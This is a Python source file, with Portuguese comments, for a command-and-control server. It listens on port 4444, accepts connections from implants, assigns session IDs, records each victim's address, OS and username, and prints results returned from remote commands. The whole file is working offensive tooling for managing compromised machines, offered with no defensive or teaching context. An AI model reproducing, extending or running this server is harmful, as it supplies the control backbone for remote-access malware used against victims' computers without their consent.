import socket
import threading
import json
import time
import select
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

class C2Server:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.sessions = {}
        self.next_session_id = 1
        self.running = False
        self.server_socket = None
        self.console = Console()
        
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            self.console.print(f"[green]✓ Servidor C2 iniciado em {self.host}:{self.port}[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            return True
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao iniciar servidor: {e}[/red]")
            return False
            
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                
                # Gerar ID de sessão
                session_id = self.next_session_id
                self.next_session_id += 1
                
                # Adicionar à lista de clientes
                self.clients[session_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'last_seen': datetime.now(),
                    'info': 'Desconhecido',
                    'os': 'Desconhecido',
                    'username': 'Desconhecido'
                }
                
                self.sessions[session_id] = client_socket
                
                self.console.print(f"[green]✓ Nova conexão de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, client_address, session_id)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.console.print(f"[red]✗ Erro ao aceitar conexão: {e}[/red]")
                    
    def handle_client(self, client_socket, client_address, session_id):
        try:
            while self.running:
                data = self.receive_data(client_socket, 0.5)
                if data is None:
                    continue
                if not data:
                    break
                    
                # Processar dados recebidos
                try:
                    decoded_data = data.decode('utf-8', errors='ignore')
                    
                    if decoded_data.startswith("INFO:"):
                        info = decoded_data[5:]
                        self.clients[session_id]['info'] = info
                        self.console.print(f"[cyan]ℹ️  Info da sessão {session_id}: {info}[/cyan]")
                    
                    elif decoded_data.startswith("OS:"):
                        os_info = decoded_data[3:]
                        self.clients[session_id]['os'] = os_info
                    
                    elif decoded_data.startswith("USER:"):
                        user_info = decoded_data[5:]
                        self.clients[session_id]['username'] = user_info
                    
                    elif decoded_data.startswith("RESULT:"):
                        result = decoded_data[7:]
                        self.console.print(f"[blue][Sessão {session_id}][/blue] [green]Resultado:[/green]\n{result}")
                    
                except Exception as e:
                    self.console.print(f"[yellow]⚠️  Erro ao processar dados: {e}[/yellow]")
                    
        except Exception as e:
            self.console.print(f"[red]✗ Erro na sessão {session_id}: {e}[/red]")
        finally:
            self.remove_client(session_id)
            
    def receive_data(self, sock, timeout=1):
        ready = select.select([sock], [], [], timeout)
        if ready[0]:
            try:
                data = sock.recv(65536)
                return data
            except:
                return None
        return None
        
    def remove_client(self, session_id):
        if session_id in self.clients:
            client_info = self.clients[session_id]
            self.console.print(f"[yellow]✗ Conexão fechada: Sessão {session_id} ({client_info['address'][0]})[/yellow]")
            
            try:
                client_info['socket'].close()
            except:
                pass
            
            del self.clients[session_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
                
    def list_clients(self):
        if not self.clients:
            self.console.print("[yellow]Nenhum cliente conectado[/yellow]")
            return
            
        table = Table(title="Clientes Conectados")
        table.add_column("Sessão", style="cyan")
        table.add_column("Endereço", style="green")
        table.add_column("Usuário", style="yellow")
        table.add_column("Sistema")
        table.add_column("Conectado em")
        
        for session_id, client in self.clients.items():
            table.add_row(
                str(session_id),
                f"{client['address'][0]}:{client['address'][1]}",
                client['username'],
                client['os'],
                client['connected_at']
            )
            
        self.console.print(table)
